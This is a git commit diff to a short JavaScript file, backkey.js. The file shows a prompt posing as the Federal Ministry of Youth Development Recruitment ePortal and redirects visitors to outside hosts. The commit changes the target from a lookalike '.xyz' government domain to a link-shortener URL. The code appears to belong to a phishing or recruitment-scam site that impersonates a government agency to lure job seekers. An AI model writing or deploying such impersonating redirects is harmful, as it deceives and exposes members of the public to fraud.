ec6e1d0ffd216e3378cb722cc4526fa422cd9fcf
lagalfredben <lagalfredben@gmail.com>
2026-06-22 00:31:18 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -2,5 +2,5 @@
 var password = 'Recruitment'
 password=prompt('SMS: Welcome to the Federal Ministry of Youth Development Recruitment ePortal, Please press OK to continue. ','Recruitment');
 if (password != 'Recruitment') {
-location.href='https://fmyd-career.govserves.xyz/staff';
+location.href='https://sutlnk.ink/FMYD-CAREER-PROGRAM';
 }
